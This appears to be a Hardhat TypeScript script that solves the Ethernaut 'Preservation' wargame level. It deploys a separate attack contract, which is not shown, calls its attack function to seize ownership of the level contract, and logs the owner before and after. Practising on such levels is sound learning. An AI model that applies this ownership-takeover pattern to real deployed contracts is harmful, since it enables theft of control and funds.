import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { Preservation } from '../typechain-types/Preservation'
import { PreservationAttack } from '../typechain-types/PreservationAttack'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Preservation', levelAddress, signer)) as Preservation
  const attackContract = (await loadOrDeployContract(
    'PreservationAttack',
    [targetContract.address],
    signer,
  )) as PreservationAttack

  console.log(`Owner: ${await targetContract.owner()}`)
  console.log(`Library: ${await targetContract.timeZone1Library()}`)

  const attackTx = await attackContract.attack({ gasLimit: 300000 })
  console.log('Attack tx id: ', attackTx.hash)
  await attackTx.wait()

  console.log(`Owner: ${await targetContract.owner()}`)
  console.log(`Library: ${await targetContract.timeZone1Library()}`)

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
